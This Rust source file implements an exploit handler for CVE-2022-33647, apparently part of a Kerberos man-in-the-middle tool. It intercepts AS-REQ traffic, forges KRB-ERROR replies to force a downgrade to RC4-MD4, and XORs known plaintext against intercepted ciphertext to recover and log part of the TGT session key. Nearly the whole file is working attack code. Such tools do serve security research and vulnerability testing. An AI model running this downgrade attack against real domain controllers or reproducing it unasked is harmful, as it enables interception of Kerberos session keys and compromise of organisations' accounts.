use bytes::Bytes;
use kile::{
    constants::{ETYPE_RC4_MD4, KDC_ERR_ETYPE_NOTSUPP},
    structures::{AsReqExt, KrbErrorExt},
    KdcFrame,
};
use rasn_kerberos::{AsRep, KrbError};
use tracing::{error, info};

use super::{Handler, HandlerAction};

/// Handler that attempts to downgrade TGT session to RC4-MD4 cipher per CVE-2022-33647
#[derive(Clone)]
pub struct Cve202233647Handler {
    pa_enc_timestamp: Option<Bytes>,
}

impl Cve202233647Handler {
    pub fn new() -> Self {
        Self {
            pa_enc_timestamp: None,
        }
    }
}

impl Handler for Cve202233647Handler {
    fn name(&self) -> &'static str {
        "CVE-2022-33647"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                Some(ETYPE_RC4_MD4) => {
                    info!("Received AS-REQ with RC4-MD4 preauth, modifying body ETYPEs and forwarding to KDC...");
                    let as_req = as_req.clone().replace_etypes(ETYPE_RC4_MD4);
                    self.pa_enc_timestamp = as_req.get_pa_enc_timestamp().map(|e| e.cipher);
                    HandlerAction::Forward(KdcFrame::AsReq(as_req))
                }
                Some(_) => {
                    info!("Received AS-REQ with unwanted preauth etype, forging KRB-ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS-REQ without preauth, forging KRB-ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsRep(as_rep) if as_rep.0.enc_part.etype == ETYPE_RC4_MD4 => {
                if let Some(pa_enc_timestamp) = &self.pa_enc_timestamp {
                    let session_key = get_tgt_session_key(pa_enc_timestamp.clone(), as_rep);
                    info!("Cracked TGT session key: {:04x}??ababababababababababab", &session_key);
                } else {
                    error!("Intercepted vulnerable AS-REP without a corresponding AS-REQ, probably a bug");
                }
                HandlerAction::Forward(frame)
            }
            KdcFrame::KrbError(krb_error) if krb_error.error_code == KDC_ERR_ETYPE_NOTSUPP => {
                error!("Received KDC_ERR_ETYPE_NOSUPP, KDC is probably not vulnerable");
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }
}

fn get_tgt_session_key(pa_enc_timestamp: Bytes, as_rep: &AsRep) -> Bytes {
    let pa_ts_plaintext = b"\xa1\x03\x02\x01";
    let enc_part_ciphertext = &as_rep.0.enc_part.cipher.slice(45..49);
    let keystream: Bytes = pa_ts_plaintext
        .iter()
        .zip(pa_enc_timestamp.slice(45..49).iter())
        .map(|(&a, &b)| a ^ b)
        .collect();
    keystream
        .iter()
        .zip(enc_part_ciphertext)
        .map(|(&a, &b)| a ^ b)
        .collect()
}
